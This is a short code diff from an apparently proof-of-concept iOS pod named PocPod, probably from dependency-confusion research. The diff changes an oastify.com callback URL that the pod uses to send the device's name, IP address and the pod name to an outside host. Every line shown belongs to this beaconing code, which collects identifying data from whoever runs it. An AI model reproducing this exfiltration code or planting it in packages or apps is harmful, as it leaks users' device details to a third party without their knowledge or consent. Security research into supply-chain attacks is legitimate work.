@@ -7,7 +7,7 @@ public class PocPod {
         let deviceName = UIDevice.current.name
         let ipAddress = getIPAddress() ?? "unknown"
 
-        let urlStr = "https://xxygcfj65ljljni9899jit989zfr3ir7.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
+        let urlStr = "https://lwlvh2q5jxf20cx77q7eln0r7idg16pv.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
         guard let encodedUrlStr = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
               let url = URL(string: encodedUrlStr) else {
             return
